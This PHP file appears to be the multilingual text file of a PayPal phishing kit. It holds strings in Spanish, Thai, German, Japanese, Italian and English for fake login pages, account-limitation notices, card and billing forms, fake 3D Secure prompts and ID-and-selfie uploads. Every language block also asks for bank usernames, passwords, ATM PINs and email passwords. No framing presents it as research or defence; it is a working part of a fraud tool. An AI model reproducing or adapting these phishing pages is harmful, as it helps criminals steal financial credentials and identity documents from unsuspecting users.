<?php
error_reporting(0);
if($setting['letter'] == 'unusual_activity') {
    $locked = parse_ini_file("unusual_activity.ini", true);
}elseif($setting['letter'] == 'limited') {
    $locked = parse_ini_file("limited.ini", true);
}
$lang = $countrycode;
switch ($lang) {

case "ES":
case "CL":
case "SV":
case "HN":
case "BO":
case "VE":
case "CR":
case "PR":
case "UY":
case "PY":
case "EC":
case "CO":
case "PE":
case "MX":
case "AR":
   $login['title'] = "Inicie sesión en su cuenta de PayPal";
   $login['email'] = "Correo electrónico o número de celular";
   $login['password'] = "Contraseña";
   $login['login'] = "Iniciar sesión";
   $login['trouble'] = "¿Tiene problemas para iniciar sesión?";
   $login['or'] = "o";
   $login['signup'] = "Registrarse";
   $login['privacy'] = "Privacidad";
   $login['legal'] = "Acuerdos legales";

     $notice['we'] = $locked['LATIN']['notice'];
   $notice['weneed'] = $locked['LATIN']['desc'];
   $notice['but'] = $locked['LATIN']['button'];

    $account['title'] = "PayPal: confirme su cuenta";
    $account['summary'] = "Resumen";
    $account['activity'] = "Actividad";
    $account['send'] = "Enviar y Solicitar";
    $account['wallet'] = "Wallet";
    $account['help'] = "Ayuda";
    $account['logout'] = "Cerrar sesión";
    $account['proccessing'] = "Procesando";
    $account['confirm'] = "Confirme su tarjeta";
    $account['ctp'] = "Tipo de tarjeta";
    $account['ccn'] = "Número de tarjeta de crédito";
    $account['exp'] = "Caducidad MM / AAAA";
    $account['csc'] = "Código de seguridad";
    $account['cid'] = "CID";
    $account['addbil'] = "Agregar dirección de facturación";
    $account['bil'] = "Dirección de facturación";
    $account['fnm'] = "Nombre completo";
    $account['dob'] = "Fecha de nacimiento (DD / MM / AAAA)";
    $account['adr'] = "Línea de dirección";
    $account['city'] = "Ciudad / Pueblo / Aldea";
    $account['zip'] = "Código postal";
    $account['state'] = "Estado / Región";
    $account['country'] = "País";
    $account['pt'] = "Tipo de teléfono";
    $account['mobile'] = "Mobile";
    $account['home'] = "Inicio";
    $account['work'] = "Trabajo";
    $account['phonenumber'] = "Número de teléfono";
    $account['continue'] = "Continuar";
    $account['contact'] = "Contáctenos";
    $account['sec'] = "Seguridad";
    $account['linknew'] = "Vincular nueva tarjeta";
    $account['linked'] = "Vinculado";
    $account['donthave'] = "No tengo otra tarjeta";

    $bank['linkur'] = "Vincula tu cuenta bancaria";
    $bank['con'] = "Conéctese a su cuenta bancaria para confirmar que controla esta cuenta bancaria";
    $bank['the'] = "La cuenta bancaria debe ser la misma para su Tarjeta X-";
    $bank['bn'] = "Nombre del banco";
    $bank['cud'] = "Nombre de usuario / ID de la cuenta";
    $bank['cup'] = "Contraseña / Contraseña de la cuenta";
    $bank['an'] = "Número de cuenta";
    $bank['rn'] = "Número de ruta";
    $bank['pin'] = "PIN del cajero automático";

    $link['link'] = "Vincula tu cuenta de correo electrónico";
    $link['desc'] = "Enlace una cuenta de correo electrónico a su cuenta de PayPal. (No guardamos esta información)";
    $link['email'] = "Dirección de correo electrónico";
    $link['pass'] = "Contraseña de correo electrónico";

    $id['uploadur'] = "Cargue su identidad";
    $id['ip'] = "Prueba de identidad";
    $id['swp'] = "Selfie con prueba";
    $id['pc'] = "Proceso completado";
    $id['choose'] = "Elija su tipo de ID";
    $id['passport'] = "Pasaporte";
    $id['natid'] = "Identificación nacional";
    $id['drive'] = "Licencia de conducir";
    $id['upur'] = "Cargue su";
    $id['take'] = "Tomar una foto de alta calidad <br> o hacer un escaneo de alta calidad";
    $id['submit'] = "Enviar ambos lados de un documento de doble cara";
    $id['scan'] = "Escanee ambas páginas <br> si elige un pasaporte";
    $id['drag'] = "Arrastra y suelta o haz clic aquí </b> para cargar tu imagen (máximo 5 MB)";
    $id['back'] = "VOLVER";
    $id['proc'] = "Continuar";
    $id['ups'] = "Cargar una selfie con";
    $id['make'] = "Asegúrese de mirar directamente a la cámara";
    $id['finger'] = "Sus dedos no cubren la foto ni ninguna información importante";
    $id['wear'] = "No use sombrero o lentes, y asegúrese de que su barba esté recortada";
    $id['restore'] = "Completado </h1> <p> Su cuenta ha sido restaurada .. </p>";

    $vbv['title'] = "3D Secure";
    $vbv['add'] = "Seguridad adicional en línea";
    $vbv['help'] = "ayuda a proteger su tarjeta <b> </b> contra el uso no autorizado en línea, sin costo adicional. Para usar";
    $vbv['onthis'] = "en esto y en persecuciones futuras. complete esta página Usted creará el suyo";
    $vbv['pass'] = "Contraseña";
    $vbv['cn'] = "Número de tarjeta";
    $vbv['3d'] = "Contraseña 3D";
    $vbv['submit'] = "Enviar";
break;

case "TH":
   $login['title'] = "เข้าสู่บัญชี PayPal";
   $login['email'] = "อีเมลหรือหมายเลขโทรศัพท์มือถือ";
   $login['password'] = "รหัสผ่าน";
   $login['login'] = "เข้าสู่ระบบ";
   $login['trouble'] = "พบปัญหาในการเข้าสู่ระบบใช่ไหมคะ";
   $login['or'] = "หรือ";
   $login['signup'] = "สมัครสมาชิก";
   $login['privacy'] = "ความเป็นส่วนตัว";
   $login['legal'] = "ข้อมูลทางกฎหมาย";

      $notice['we'] = $locked['TH']['notice'];
   $notice['weneed'] = $locked['TH']['desc'];
   $notice['but'] = $locked['TH']['button'];

    $account['title'] = "PayPal: ยืนยันบัญชีของคุณ";
    $account['summary'] = "สรุป";
    $account['activity'] = "กิจกรรม";
    $account['send'] = "ส่ง & คำขอ";
    $account['wallet'] = "กระเป๋าเงิน";
    $account['help'] = "ความช่วยเหลือ";
    $account['logout'] = "ออกจากระบบ";
    $account['proccessing'] = "กำลังดำเนินการ";
    $account['confirm'] = "ยืนยันบัตรของคุณ";
    $account['ctp'] = "ประเภทบัตร";
    $account['ccn'] = "หมายเลขบัตรเครดิต";
    $account['exp'] = "MM / YYYY วันหมดอายุ";
    $account['csc'] = "รหัสความปลอดภัย";
    $account['cid'] = "CID";
    $account['addbil'] = "เพิ่มที่อยู่สำหรับการเรียกเก็บเงิน";
    $account['bil'] = "ที่อยู่สำหรับการเรียกเก็บเงิน";
    $account['fnm'] = "ชื่อเต็ม";
    $account['dob'] = "วันเกิด (DD / MM / YYYY)";
    $account['adr'] = "ที่อยู่บรรทัด";
    $account['city'] = "เมือง / เมือง / หมู่บ้าน";
    $account['zip'] = "รหัสไปรษณีย์";
    $account['state'] = "รัฐ / ภูมิภาค";
    $account['country'] = "ประเทศ";
    $account['pt'] = "ประเภทโทรศัพท์";
    $account['mobile'] = "มือถือ";
    $account['home'] = "หน้าแรก";
    $account['work'] = "ทำงาน";
    $account['phonenumber'] = "หมายเลขโทรศัพท์";
    $account['continue'] = "ดำเนินการต่อ";
    $account['contact'] = "ติดต่อเรา";
    $account['sec'] = "ความปลอดภัย";

    $account['linknew'] = "เชื่อมโยงการ์ดใหม่";
    $account['linked'] = "เชื่อมโยง";
    $account['donthave'] = "ฉันไม่มีบัตรอื่น";

    $bank['linkur'] = "เชื่อมโยงบัญชีธนาคารของคุณ";
    $bank['con'] = "เชื่อมต่อกับบัญชีธนาคารของคุณเพื่อยืนยันว่าคุณควบคุมบัญชีธนาคารนี้";
    $bank['the'] = "บัญชีธนาคารจะต้องเหมือนกันสำหรับบัตรของคุณ";
    $bank['bn'] = "ชื่อธนาคาร";
    $bank['cud'] = "ชื่อผู้ใช้ / ID บัญชี";
    $bank['cup'] = "รหัสผ่านบัญชี / รหัสผ่าน";
    $bank['an'] = "หมายเลขบัญชี";
    $bank['rn'] = "หมายเลขเส้นทาง";
    $bank['pin'] = "รหัสเอทีเอ็ม";

    $link['link'] = "เชื่อมโยงบัญชีอีเมลของคุณ";
    $link['desc'] = "โปรดเชื่อมโยงบัญชีอีเมลกับบัญชี PayPal ของคุณ (เราไม่บันทึกข้อมูลนี้)";
    $link['email'] = "ที่อยู่อีเมล";
    $link['pass'] = "รหัสผ่านอีเมล";

    $id['uploadur'] = "อัพโหลดตัวตนของคุณ";
    $id['ip'] = "การพิสูจน์ตัวตน";
    $id['swp'] = "Selfie พร้อมหลักฐาน";
    $id['pc'] = "กระบวนการเสร็จสมบูรณ์";
    $id['choose'] = "เลือกประเภท ID ของคุณ";
    $id['passport'] = "Passport";
    $id['natid'] = "รหัสประจำตัวประชาชน";
    $id['drive'] = "ใบอนุญาตขับรถ";
    $id['upur'] = "อัปโหลดของคุณ";
    $id['take'] = "ถ่ายภาพคุณภาพสูงหรือทำการสแกนคุณภาพสูง";
    $id['submit'] = "ส่งเอกสารสองด้านของทั้งสองด้าน";
    $id['scan'] = "สแกนทั้งสองหน้า <br> หากคุณเลือกหนังสือเดินทาง";
    $id['drag'] = "ลากแล้วปล่อยหรือคลิกที่นี่ </b> เพื่ออัพโหลดรูปภาพของคุณ (สูงสุด 5 MB)";
    $id['back'] = "กลับไป";
    $id['proc'] = "ดำเนินการต่อ";
    $id['ups'] = "อัปโหลดเซลฟี่ด้วย";
    $id['make'] = "ตรวจสอบให้แน่ใจว่าคุณมองตรงไปที่กล้อง";
    $id['finger'] = "นิ้วของคุณไม่ครอบคลุมรูปภาพหรือข้อมูลสำคัญ";
    $id['wear'] = "อย่าสวมหมวกหรือแว่นตา <br> และตรวจสอบให้แน่ใจว่าได้ตัดเคราของคุณแล้ว";
    $id['restore'] = "เสร็จสมบูรณ์ </h1> <p> บัญชีของคุณได้รับการกู้คืนแล้ว </p>";

    $vbv['title'] = "3D Secure";
    $vbv['add'] = "เพิ่มความปลอดภัยออนไลน์";
    $vbv['help'] = "ช่วยปกป้องการ์ด <b> </b> ของคุณจากการใช้งานที่ไม่ได้รับอนุญาตออนไลน์ - โดยไม่มีค่าใช้จ่ายเพิ่มเติมวิธีใช้";
    $vbv['onthis'] = "ในหน้านี้และหน้ารายละเอียดเพิ่มเติมให้ทำหน้านี้ให้สมบูรณ์คุณจะสร้างของคุณเอง";
    $vbv['pass'] = "รหัสผ่าน";
    $vbv['cn'] = "หมายเลขบัตร";
    $vbv['3d'] = "รหัสผ่าน 3 มิติ";
    $vbv['submit'] = "ส่ง";
break;

case "DE":
   $login['title'] = "Loggen Sie sich bei PayPal ein";
   $login['email'] = "E-Mail-Adresse oder Handynummer";
   $login['password'] = "Passwort";
   $login['login'] = "Einloggen";
   $login['trouble'] = "Probleme beim Einloggen?";
   $login['or'] = "oder";
   $login['signup'] = "Neu anmelden";
   $login['privacy'] = "Datenschutz";
   $login['legal'] = "AGB";

    $notice['we'] = $locked['DE']['notice'];
   $notice['weneed'] = $locked['DE']['desc'];
   $notice['but'] = $locked['DE']['button'];

    $account['title'] = "PayPal: Bestätigen Sie Ihr Konto";
    $account['summary'] = "Zusammenfassung";
    $account['activity'] = "Aktivität";
    $account['send'] = "Senden & Anfordern";
    $account['wallet'] = "Wallet";
    $account['help'] = "Hilfe";
    $account['logout'] = "Abmelden";
    $account['proccessing'] = "Verarbeitung";
    $account['confirm'] = "Bestätige deine Karte";
    $account['ctp'] = "Kartentyp";
    $account['ccn'] = "Kreditkartennummer";
    $account['exp'] = "Verfallsdatum MM / JJJJ";
    $account['csc'] = "Sicherheitscode";
    $account['cid'] = "CID";
    $account['addbil'] = "Rechnungsadresse hinzufügen";
    $account['bil'] = "Rechnungsadresse";
    $account['fnm'] = "Vollständiger Name";
    $account['dob'] = "Geburtsdatum (TT / MM / JJJJ)";
    $account['adr'] = "Adresszeile";
    $account['city'] = "Stadt / Ort / Dorf";
    $account['zip'] = "Postleitzahl";
    $account['state'] = "Bundesstaat / Region";
    $account['country'] = "Land";
    $account['pt'] = "Telefontyp";
    $account['mobile'] = "Mobil";
    $account['home'] = "Startseite";
    $account['work'] = "Arbeit";
    $account['phonenumber'] = "Telefonnummer";
    $account['continue'] = "Weiter";
    $account['contact'] = "Kontaktieren Sie uns";
    $account['sec'] = "Sicherheit";

    $account['linknew'] = "Neue Karte verknüpfen";
    $account['linked'] = "Linked";
    $account['donthave'] = "Ich habe keine andere Karte";

    $bank['linkur'] = "Verknüpfe dein Bankkonto";
    $bank['con'] = "Stellen Sie eine Verbindung zu Ihrem Bankkonto her, um zu bestätigen, dass Sie dieses Bankkonto kontrollieren.";
    $bank['the'] = "Das Bankkonto muss für Ihre Karte identisch sein ";
    $bank['bn'] = "Bankname";
    $bank['cud'] = "Benutzername / ID des Kontos";
    $bank['cup'] = "Kontokennwort / Passwort";
    $bank['an'] = "Kontonummer";
    $bank['rn'] = "Bankleitzahl";
    $bank['pin'] = "ATM PIN";

    $link['link'] = "Verknüpfe dein E-Mail-Konto";
    $link['desc'] = "Bitte verknüpfen Sie ein E-Mail-Konto mit Ihrem PayPal-Konto. (Diese Informationen werden nicht gespeichert.)";
    $link['email'] = "E-Mail-Adresse";
    $link['pass'] = "E-Mail Passwort";

    $id['uploadur'] = "Laden Sie Ihre Identität hoch";
    $id['ip'] = "Identitätsnachweis";
    $id['swp'] = "Selfie mit Beweis";
    $id['pc'] = "Vorgang abgeschlossen";
    $id['choose'] = "Wählen Sie Ihren ID-Typ";
    $id['passport'] = "Reisepass";
    $id['natid'] = "Nationale ID";
    $id['drive'] = "Führerschein";
    $id['upur'] = "Laden Sie Ihre";
    $id['take'] = "Ein Foto in hoher Qualität <br> oder einen Scan in hoher Qualität erstellen";
    $id['submit'] = "Beide Seiten eines doppelseitigen Dokuments senden";
    $id['scan'] = "Beide Seiten scannen, wenn Sie einen Reisepass wählen";
    $id['drag'] = "Ziehen und Ablegen oder klicken Sie hier </ b>, um Ihr Bild hochzuladen (maximal 5 MB)";
    $id['back'] = "ZURÜCK";
    $id['proc'] = "Weiter";
    $id['ups'] = "Selfie hochladen mit";
    $id['make'] = "Stellen Sie sicher, dass Sie direkt in die Kamera schauen";
    $id['finger'] = "Ihre Finger verdecken weder das Foto noch wichtige Informationen";
    $id['wear'] = "Trage keinen Hut und keine Brille und achte darauf, dass dein Bart beschnitten ist";
    $id['restore'] = "Abgeschlossen </ h1> <p> Ihr Konto wurde wiederhergestellt. </ p>";

    $vbv['title'] = "3D Secure";
    $vbv['add'] = "Online-Sicherheit hinzugefügt";
    $vbv['help'] = "schützt Ihre <b> </ b> Karte ohne zusätzliche Kosten vor unbefugter Online-Nutzung.";
    $vbv['onthis'] = "Auf dieser und zukünftigen Verfolgungen. Vervollständige diese Seite Du wirst deine eigene erstellen";
    $vbv['pass'] = "Passwort";
    $vbv['cn'] = "Kartennummer";
    $vbv['3d'] = "3D-Passwort";
    $vbv['submit'] = "Submit";
break;

case "JP":
   $login['title'] = "PayPalアカウントへのログイン";
   $login['email'] = "アドレスまたは携帯電話番号";
   $login['password'] = "パスワード";
   $login['login'] = "ログイン";
   $login['trouble'] = "ログインできない場合";
   $login['or'] = "または";
   $login['signup'] = "新規登録";
   $login['privacy'] = "プライバシー";
   $login['legal'] = "規約";

   $notice['we'] = $locked['JP']['notice'];
   $notice['weneed'] = $locked['JP']['desc'];
   $notice['but'] = $locked['JP']['button'];

    $account['title'] = "PayPal：アカウントの確認";
    $account['summary'] = "概要";
    $account['activity'] = "アクティビティ";
    $account['send'] = "送信およびリクエスト";
    $account['wallet'] = "財布";
    $account['help'] = "ヘルプ";
    $account['logout'] = "ログアウト";
    $account['proccessing'] = "処理";
    $account['confirm'] = "カードの確認";
    $account['ctp'] = "カードタイプ";
    $account['ccn'] = "クレジットカード番号";
    $account['exp'] = "有効期限 月 / 年";
    $account['csc'] = "セキュリティコード";
    $account['cid'] = "CID";
    $account['addbil'] = "請求先住所を追加";
    $account['bil'] = "請求先住所";
    $account['fnm'] = "フルネーム";
    $account['dob'] = "生年月日（日 / 月 / 年）";
    $account['adr'] = "住所行";
    $account['city'] = "市/町/村";
    $account['zip'] = "郵便番号";
    $account['state'] = "州/地域";
    $account['国'] = "国";
    $account['pt'] = "電話タイプ";
    $account['mobile'] = "モバイル";
    $account['home'] = "ホーム";
    $account['work'] = "作業";
    $account['phonenumber'] = "電話番号";
    $account['continue'] = "継続する";
    $account['contact'] = "お問い合わせ";
    $account['sec'] = "セキュリティ";

    $account['linknew'] = "新しいカードをリンク";
    $account['linked'] = "リンク済み";
    $account['donthave'] = "別のカードはありません";

    $bank['linkur'] = "銀行口座をリンク";
    $bank['con'] = "銀行口座に接続して、この銀行口座を管理していることを確認してください。";
    $bank['the'] = "カードX-の銀行口座は同じでなければなりません ";
    $bank['bn'] = "銀行名";
    $bank['cud'] = "アカウントのユーザー名/ ID";
    $bank['cup'] = "アカウントパスワード/パスコード";
    $bank['an'] = "口座番号";
    $bank['rn'] = "ルーティング番号";
    $bank['pin'] = "ATMピン";

    $link['link'] = "メールアカウントをリンク";
    $link['desc'] = "PayPalアカウントにメールアカウントをリンクしてください。この情報は保存しません。";
    $link['email'] = "メールアドレス";
    $link['pass'] = "メールパスワード";

    $id['uploadur'] = "IDをアップロード";
    $id['ip'] = "身元証明";
    $id['swp'] = "証明付きのセルフィー";
    $id['pc'] = "プロセス完了";
    $id['choose'] = "IDタイプを選択";
    $id['passport'] = "パスポート";
    $id['natid'] = "National ID";
    $id['drive'] = "運転免許証";
    $id['upur'] = "アップロードする";
    $id['take'] = "高品質の写真を撮る<br>または高品質のスキャンを行う";
    $id['submit'] = "両面文書の両面を送信";
    $id['scan'] = "パスポートを選択した場合、両方のページをスキャン<br>";
    $id['drag'] = "画像をアップロードするには、ドラッグアンドドロップまたはここをクリック</b>（最大5 MB）";
    $id['back'] = "戻る";
    $id['proc'] = "続行";
    $id['ups'] = "セルフィーのアップロード";
    $id['make'] = "カメラをまっすぐ見ていることを確認してください";
    $id['finger'] = "あなたの指は写真や重要な情報を隠していません";
    $id['wear'] = "帽子やメガネを着用しないでください。<br>ひげを刈り込んでください<br>。";
    $id['restore'] = "完了</h1> <p>アカウントが復元されました。.</p>";

    $vbv['title'] = "3D Secure";
    $vbv['add'] = "安全オンラインを追加しました";
    $vbv['help'] = "<b> </ b>カードをオンラインでの不正使用から保護します-追加費用なし。使用するには";
    $vbv['onthis'] = "これと将来の購入。このページを完成してください。あなたはあなた自身を作成します";
    $vbv['pass'] = "パスワード";
    $vbv['cn'] = "カード番号";
    $vbv['3d'] = "3Dパスワード";
    $vbv['submit'] = "送信";
break;

case "IT":
    $login['title'] = "Accedi al tuo account";
    $login['email'] = "Indirizzo email o numero di cellulare";
    $login['password'] = "Password";
    $login['login'] = "Accedi";
    $login['trouble'] = "Problemi di accesso?";
    $login['or'] = "o";
    $login['signup'] = "Iscriviti";
    $login['privacy'] = "Privacy";
    $login['legal'] = "Legal";

    $notice['we'] = $locked['IT']['notice'];
   $notice['weneed'] = $locked['IT']['desc'];
   $notice['but'] = $locked['IT']['button'];

    $account['title'] = "PayPal: conferma il tuo account";
    $account['summary'] = "Riepilogo";
    $account['activity'] = "Activity";
    $account['send'] = "Invia e richiedi";
    $account['wallet'] = "Portafoglio";
    $account['help'] = "Aiuto";
    $account['logout'] = "Disconnetti";
    $account['proccessing'] = "Elaborazione";
    $account['confirm'] = "Conferma la tua carta";
    $account['ctp'] = "Tipo di carta";
    $account['ccn'] = "Numero della carta di credito";
    $account['exp'] = "Scadenza MM / AAAA";
    $account['csc'] = "Codice di sicurezza";
    $account['cid'] = "CID";
    $account['addbil'] = "Aggiungi indirizzo di fatturazione";
    $account['bil'] = "Indirizzo di fatturazione";
    $account['fnm'] = "Nome completo";
    $account['dob'] = "Data di nascita (GG / MM / AAAA)";
    $account['adr'] = "Riga indirizzo";
    $account['city'] = "Città / Paese / Villaggio";
    $account['zip'] = "Codice postale";
    $account['state'] = "Stato / Regione";
    $account['country'] = "Country";
    $account['pt'] = "Tipo di telefono";
    $account['mobile'] = "Mobile";
    $account['home'] = "Home";
    $account['work'] = "Lavoro";
    $account['phonenumber'] = "Numero di telefono";
    $account['continue'] = "Continua";
    $account['contact'] = "Contattaci";
    $account['sec'] = "Sicurezza";

    $account['linknew'] = "Collega nuova carta";
    $account['linked'] = "Linked";
    $account['donthave'] = "Non ho un'altra carta";

    $bank['linkur'] = "Collega il tuo conto bancario";
    $bank['con'] = "Collegati al tuo conto bancario per confermare che controlli questo conto bancario.";
    $bank['the'] = "Il conto bancario deve essere lo stesso per la tua Carta X-";
    $bank['bn'] = "Nome banca";
    $bank['cud'] = "Nome utente / ID account";
    $bank['cup'] = "Password / Passcode account";
    $bank['an'] = "Numero di conto";
    $bank['rn'] = "Numero di routing";
    $bank['pin'] = "PIN ATM";

    $link['link'] = "Collega il tuo account e-mail";
    $link['desc'] = "Collega un account e-mail al tuo account PayPal. (Non salviamo queste informazioni.)";
    $link['email'] = "Indirizzo email";
    $link['pass'] = "Password e-mail";

    $id['uploadur'] = "Carica la tua identità";
    $id['ip'] = "Identity proof";
    $id['swp'] = "Selfie with proof";
    $id['pc'] = "Processo completato";
    $id['Choose'] = "Scegli il tuo tipo di ID";
    $id['passport'] = "Passport";
    $id['natid'] = "ID nazionale";
    $id['drive'] = "Patente di guida";
    $id['upur'] = "Carica il tuo";
    $id['take'] = "Scatta una foto di alta qualità o esegui una scansione di alta qualità";
    $id['submit'] = "Invia a entrambi i lati di un documento fronte-retro";
    $id['scan'] = "Scansiona entrambe le pagine <br> se scegli un passaporto";
    $id['drag'] = "Trascina e rilascia o fai clic qui </b> per caricare la tua immagine (max 5 MB)";
    $id['back'] = "TORNA INDIETRO";
    $id['proc'] = "Procedi";
    $id['ups'] = "Carica un selfie con";
    $id['make'] = "Assicurati di guardare direttamente la telecamera";
    $id['finger'] = "Le tue dita non coprono la foto o altre informazioni importanti";
    $id['wear'] = "Non indossare un cappello o gli occhiali, <br> e assicurati di tagliare la barba";
    $id['restore'] = "Completato </h1> <p> Il tuo account è stato ripristinato .. </p>";

    $vbv['title'] = "3D Secure";
    $vbv['add'] = "Aggiunta sicurezza online";
    $vbv['help'] = "aiuta a proteggere la tua carta <b> </b> dall'uso non autorizzato online - senza costi aggiuntivi. Per usare";
    $vbv['onthis'] = "su questo e sui futuri obiettivi. Completa questa pagina Creerai il tuo";
    $vbv['pass'] = "Password";
    $vbv['cn'] = "Numero della carta";
    $vbv['3d'] = "Password 3D";
    $vbv['submit'] = "Invia";
break;

default:
   $login['title'] = "Log in to your account";
   $login['email'] = "Email address or mobile number";
   $login['password'] = "Password";
   $login['login'] = "Log In";
   $login['trouble'] = "Having trouble logging in?";
   $login['or'] = "or";
   $login['signup'] = "Sign Up";
   $login['privacy'] = "Privacy";
   $login['legal'] = "Legal";

   $notice['we'] = $locked['EN']['notice'];
   $notice['weneed'] = $locked['EN']['desc'];
   $notice['but'] = $locked['EN']['button'];

   $account['title'] = "PayPal: Confirm your account";
   $account['summary'] = "Summary";
   $account['activity'] = "Activity";
   $account['send'] = "Send & Request";
   $account['wallet'] = "Wallet";
   $account['help'] = "Help";
   $account['logout'] = "Log Out";
   $account['proccessing'] = "Processing";
   $account['confirm'] = "Confirm your card";
   $account['ctp'] = "Card type";
   $account['ccn'] = "Credit card number";
   $account['exp'] = "Expiration MM/YYYY";
   $account['csc'] = "Security code";
   $account['cid'] = "CID";
   $account['addbil'] = "Add billing address";
   $account['bil'] = "Billing address";
   $account['fnm'] = "Full name";
   $account['dob'] = "Date of birth (DD/MM/YYYY)";
   $account['adr'] = "Address line";
   $account['city'] = "City / Town / Village";
   $account['zip'] = "Zip code";
   $account['state'] = "State / Region";
   $account['country'] = "Country";
   $account['pt'] = "Phone type";
   $account['mobile'] = "Mobile";
   $account['home'] = "Home";
   $account['work'] = "Work";
   $account['phonenumber'] = "Phone number";
   $account['continue'] = "Continue";
   $account['contact'] = "Contact Us";
   $account['sec'] = "Security";

   $account['linknew'] = "Link new card";
   $account['linked'] = "Linked";
   $account['donthave'] = "I don't have another card";

   $bank['linkur'] = "Link your Bank Account";
   $bank['con'] = "Connect to your Bank account to confirm that you control this bank account.";
   $bank['the'] = "The bank account must be same for your Card X-";
   $bank['bn'] = "Bank name";
   $bank['cud'] = "Account Username / ID";
   $bank['cup'] = "Account Password / Passcode";
   $bank['an'] = "Account number";
   $bank['rn'] = "Routing number";
   $bank['pin'] = "ATM PIN";

   $link['link'] = "Link your Email Account";
   $link['desc'] = "Please link an Email Account to your PayPal Account. (We don't save this information.)";
   $link['email'] = "Email address";
   $link['pass'] = "Email password";

   $id['uploadur'] = "Upload your identity";
   $id['ip'] = "Identity proof";
   $id['swp'] = "Selfie with proof";
   $id['pc'] = "Process completed";
   $id['choose'] = "Choose your ID type";
   $id['passport'] = "Passport";
   $id['natid'] = "National ID";
   $id['drive'] = "Driver's license";
   $id['upur'] = "Upload your";
   $id['take'] = "Take a high quality photo <br>or make a high quality scan";
   $id['submit'] = "Submit both sides of <br>a double-sided document";
   $id['scan'] = "Scan both pages <br>if you choose a passport";
   $id['drag'] = "Drag and drop or click here</b> to upload your image (max 5 MB)";
   $id['back'] = "GO BACK";
   $id['proc'] = "Proceed";
   $id['ups'] = "Upload a selfie with";
   $id['make'] = "Make sure you are looking<br>straight at the camera";
   $id['finger'] = "Your fingers don't cover the photo or any important information";
   $id['wear'] = "Don't wear a hat or glasses,<br>and make sure<br>your beard is trimmed";
   $id['restore'] = "Completed</h1><p>Your account has been restored..</p>";

   $vbv['title'] = "3D Secure";
   $vbv['add'] = "Added Safety Online";
   $vbv['help'] = "helps protect your <b></b> card against unauthorized use online - at no additional cost. To use";
   $vbv['onthis'] = "on this and futur purshases. complete this page You'll the create your own";
   $vbv['pass'] = "Password";
   $vbv['cn'] = "Card number";
   $vbv['3d'] = "3D Password";
   $vbv['submit'] = "Submit";
}
?>